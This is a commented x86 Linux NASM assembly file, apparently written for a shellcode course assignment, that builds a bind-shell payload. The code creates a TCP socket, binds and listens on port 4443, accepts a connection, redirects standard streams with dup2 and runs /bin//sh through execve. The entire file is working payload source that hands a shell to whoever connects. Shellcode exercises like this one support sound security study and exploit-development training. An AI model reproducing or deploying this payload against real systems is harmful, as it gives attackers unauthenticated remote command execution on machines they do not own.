; Filename: Shell_Bind_TCP.nasm
; Author:  Jake Homberg
; Website:  http://somewhatsec.wordpress.com
; SLAE - 1049
; Purpose: Create a Bind shell payload to work on a TCP
; connection over a specified port.

global _start

section .text
_start:
	; Prepare the registers for the socketcall socket
	; creation. Values in the stack need to be a word
	; of 0's for the TCP, a value of 01 for SOCK_STREAM
	; and a value of 02 for AF_INET in that order.
	xor    eax, eax         ; Clear out the EAX
	push   eax              ; Move the Zeroed out EAX onto the Stack
	inc    eax              ; Increment the EAX to get the SOCK_Stream Value
	push   eax              ; Push the Socketcall value onto the the Stack
	pop    ebx		; Get the Socketcall value for Socket in the EAX
	push   eax		; Push the SOCK_STREAM identifier onto the stack
	inc    eax              ; Increment the EAX value to 2, for AF_INET
	push   eax		; Push the AF_INET value onto the stack

	; Run the syscall
	mov al, 0x66		; Set the EAX for the Syscall SocketCall
	mov ecx, esp		; Set the ECX to contain a pointer to the Stack (ESP)
	int 0x80				; Run the Socketcall Socket
	mov edi, eax		; Take the returned file descriptor for socket and store it
									; in the EDI register

	; Now that the socket has been created, we need to
	; set up a bind on a TCP port. To do this, we will
	; need to create an argument array by putting them
	; onto the stack in reverse order.
	pop ebx						; Take the value of 2 off of the stack and put it into EBX
	pop eax						; Take the value of 1 and put it into the EAX
	mov ax, 0x5b11		; Move the port (4443) onto the EAX register
	push ax						; Push the port number onto the stack
	push bx						; Push the value of 2 onto the stack
	mov ecx, esp			; Set the ECX to a pointer for the ESP
	xor eax, eax			; Use xor to clear out the EAX
	mov al, 0x10			; Set the EAX to 10 for the length of the socket address
	push eax			; Pusth the length to the stack
	push ecx		; Push the pointer for the stack onto the stack
	push edi		; Push the file descriptor for the socket connection

	; Run the Syscall. Note that we never modified EBX
	; after setting to 2, so leaving as is should be fine
	mov al, 0x66		; Set the EAX for the Socketcall
	mov ecx, esp		; Set the ECX to the pointer for the stack
	int 0x80		; Run the SocketCall for the Bind connection

	; Next up is to make the Bind socket listen for a connection
	; We will make the arguments on the stack the same as we have
	; been doing previously
	push eax		; Push the null value of EAX onto the stack
	push edi		; Push the File Descriptor for the Socket onto the stack

	; And now to run the syscall. Listen calls will return a 0 in the
	; EAX register
	mov al, 0x66		; Set EAX to Syscall SocketCall
	mov bl, 0x4		; Set EBX to 4 for the Listen call
	mov ecx, esp		; Set the ECX to the pointer for the Stack
	int 0x80		; Run the Socketcall for the Listen call

	; Now that we have the Bind socket listening, we need to
	; set it up to accept a connection. Many of the registers
	; are already set frin the previous call and dont need to be modified.
	; Once again, we have to run that syscall for socketcall
	mov al, 0x66		; Set the EAX to Syscall SocketCall
	inc ebx			; Increment the EBX to 5 for our Accept call
	int 0x80		; Run the Socketcall for the Accept call

	; Next step is to iterate through the file descriptors for the
	; dup2 function. We will first set up the registers, then use a
	; JNZ to do our loop.
	xchg eax, ebx		; Set the EBX to the file descriptor, set the EAX to 5
	xor ecx, ecx		; Zero out the ECX for out loop counter
	mov cl, 0x3		; Set the loop counter for 3. Decrement will be done in
				; the beginning of the loop, so this is 3 not 2.

dup_loop:			; dup_loop label for our jump instruction
	mov al, 0x3f		; Syscall for Dup2
	dec ecx			; Decrement the ECX so it is ready for the call to run
	int 0x80		; Run the Syscall for dup2
	jnz dup_loop		; If ECX not zero, jump to the dup_loop label

	; Last up, we have the execve function. This is pretty standard
	; from the class materials.
	salc			; Zero out the EAX
	mov ecx, eax		; Put a value of null into the ECX
	mov edx, eax		; Put a value of null into the EDX
	push eax		; Put a null onto the stack
	mov al, 0xb		; Set the EAX for execve
	push 0x68732f2f		; Push "sh//" onto the stack
	push 0x6e69622f		; Push "nib." onto the stack
	mov ebx, esp		; Put a pointer to the ESP in the EBX
	int 0x80		; Run the call
